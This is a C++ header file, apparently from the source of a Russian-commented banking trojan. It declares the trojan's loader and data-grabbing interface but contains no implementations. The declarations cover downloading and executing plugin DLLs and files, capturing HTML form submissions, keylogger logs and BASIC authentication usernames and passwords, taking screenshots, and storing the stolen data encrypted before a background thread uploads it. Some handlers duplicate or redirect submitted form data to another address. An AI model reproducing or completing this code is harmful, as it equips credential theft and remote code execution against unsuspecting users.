#ifndef LoaderH
#define LoaderH
//----------------------------------------------------------------------------

#include <windows.h>

#include "BotHTTP.h"
#include "BotClasses.h"

typedef struct TSendHTMLData
{
	PCHAR URL;         // Адрес, источник данных
	DWORD BrowserType; // Тип браузера
	PCHAR UserAgent;   // Имя агента
	DWORD DataType;    // Тип отправляемых данных
	PCHAR Data;        // Отправляемые данные
	PCHAR BotID;       // Идентификатор бота

} *PSendHTMLData;


bool CheckHost( char *Host );

//bool GrabberReports( char *Url, char *Buffer, DWORD dwBufSize );

//****************************************************************************
//  DownloadPlugin - Функция загружает с сервера плагин (DLL)
//****************************************************************************
LPVOID DownloadPlugin(PCHAR URL);



bool DownloadInternet( char *Url, WCHAR *FileName, DWORD dwFile, LPBYTE *lpMem, LPDWORD dwMemSize  );

bool DownloadInFile( char *Url, WCHAR *FileName );
bool DownloadInMem( char *Url, LPBYTE *lpMem, LPDWORD dwSize );


bool MySend( SOCKET Socket, const char *Data, int DataLen );
char **GetRealAddress( char *Host );

//bool WINAPI SendFormGrabberLogs(char *URL, char *Logs, char *UserAgent, DWORD dwBrowser, DWORD dwType );
bool SendFirstInfo();
bool SendTradeInfo( char *Buffer );

char *GetInfoFromBcServer( char *Url );
bool SendScreen( LPVOID lpFile, DWORD dwFileSize );

bool AsyncDownload( char *Url, LPBYTE *lpBuffer, LPDWORD dwSize );

void SetSBStarted(bool bStartHideJava_SB);
bool GetSBStarted();

bool ExecuteFile( char *Url, WCHAR *FileName );

#define HTONS(x) (((x) << 8) | ((x) >> 8))


//****************************************************************************
//  SendGrabberReport - функция отправляет отчёт с полученными данными
//****************************************************************************
bool SendGrabberReport(PCHAR URL, PCHAR Buf, DWORD BufSize);

// Функция отправляеи данные на сервер
//bool SendHTMLDataToServer(PCHAR URL, PSendHTMLData Data, PCHAR *Response);

//------------------------ Обработчики отправки данных ---------------------//

// Событие отправки данных
typedef void (*PSendDataEvent)(PSendHTMLData, // ссылка на отправляемые данные
							   bool&,	      // указание прервать текущую обработку
							   bool&);        // указание прервать отправку данных

// Режим обработки
enum THandleDataMode  {hdmUnknown,   // Режим не установлен
					   hdmDuplicate, // Доблировать на указанный адрес
					   hdmRedirect   // Перенаправлять на указанный адрес
					   };

// Зарегистрировать обработчик отправки
DWORD RegisterSendDataHandler(PCHAR HandleURL, PSendDataEvent Event, THandleDataMode Mode, PCHAR SendURL);

//----------------------------------------------------------------------------
/// Функции добавленные при добавлении RuBnk
typedef struct
{
	char *FilePath;
	DWORD dwType;
} BSSINIST, *PBSSINIST;

//#ifdef RuBnkH
DWORD WINAPI SendBSSInist( LPVOID lpData);
char *RecvAndParse( SOCKET Socket, LPDWORD dwRecved );
//#endif



//****************************************************************************
//  DataGrabber - Функции для работы с отправляемыми данными
//****************************************************************************


#define DATA_BLOCK_URL       1
#define DATA_BLOCK_USERAGENT 2
#define DATA_BLOCK_DATA      3


// Типы отправляемых на сервер данных
#define DATA_TYPE_FORM   1
#define DATA_TYPE_INJECT 2
#define DATA_TYPE_KEYLOG 3


namespace DataGrabber
{
	// Функция возвращает путь к папке хранилища данных
	PCHAR GetRepositoryPath();

	// Функция возвращает уникальное имя файла для хранения данных
	PCHAR GetDataFileName();

	// Функция возвращает пароль, которым будут шифроваться файлы
	PCHAR GetRepositoryPassword();

	// Отправить файл данных на сервер
    bool SendDataFile(PCHAR FileName);

	// Запустить поток отложенной отправки данных
	void StartDataSender();


	//---------------------------------------------------------------
	// Методы добавления данных в хранилище, для дальнейшей отправки
	//---------------------------------------------------------------

	// Функция складывает данные в хранилище для последующей отправки
	bool AddData(PCHAR URL, PCHAR Data, PCHAR UserAgent, DWORD Browser, DWORD DataType);

	// Добавить данные HTML формы
    bool AddHTMLFormData(PCHAR URL, PCHAR Data, PCHAR UserAgent, DWORD Browser, DWORD DataType);


	// Функция добавляет данные BASIC авторизации для отправки на сервер
	void AddBASICAuthorizationData(PHTTPSessionInfo Session, PCHAR UserName, PCHAR Password);


	//---------------------------------------------------------------
	// Методы отправки файлов
	//---------------------------------------------------------------

	// Отправить данные HTML форм
	bool SendFormGrabberData(PDataFile File);


	// Дополнительные методы отправки
	bool SendHTMLDataToServer(PCHAR URL, PSendHTMLData Data, PCHAR *Response);

	// Отправить логи ЛейЛогера
    bool SendKeyLogerData(PDataFile File);
}


//----------------------------------------------------------------------------
#endif



